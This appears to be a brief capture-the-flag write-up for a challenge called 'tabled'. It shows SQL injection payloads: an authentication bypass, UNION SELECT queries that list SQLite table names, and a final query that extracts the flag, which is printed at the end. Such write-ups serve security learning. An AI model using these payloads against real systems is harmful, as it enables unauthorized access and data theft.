# tabled

Create user asdf:asdf

`' OR 1=1;--'` logs in successfully

Test payloads locally
* c.execute("SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'a%'")
* c.execute("SELECT username FROM users WHERE username='' UNION SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'a%'")
* c.execute("SELECT flag FROM agbG6wiYUCZERs7NhuFlWfTdGlulJWYgC1pnf3xwO7CB6eeaKVV8gsyDpBCQSCBKcpc4cuVBgdal0Fx9bzx2m1pjCMjglEez5BtlT")

Execute remotely
* `' UNION SELECT name FROM sqlite_master WHERE type='table' AND name LIKE 'a%';--`
* Table name: `acec0BJ4k2s5GChPzuR9Gfp3gBF3vmyzXKB8wDsivbThYAA6TIZHLNzpa59Sk7LXtDGeM9ndokxZsXE3bhluUu3ANA1vXInzhXJtu`
* `' UNION SELECT flag FROM acec0BJ4k2s5GChPzuR9Gfp3gBF3vmyzXKB8wDsivbThYAA6TIZHLNzpa59Sk7LXtDGeM9ndokxZsXE3bhluUu3ANA1vXInzhXJtu;--`

`LITCTF{w04h_sQl?_l0v3_to_S3e_iT}`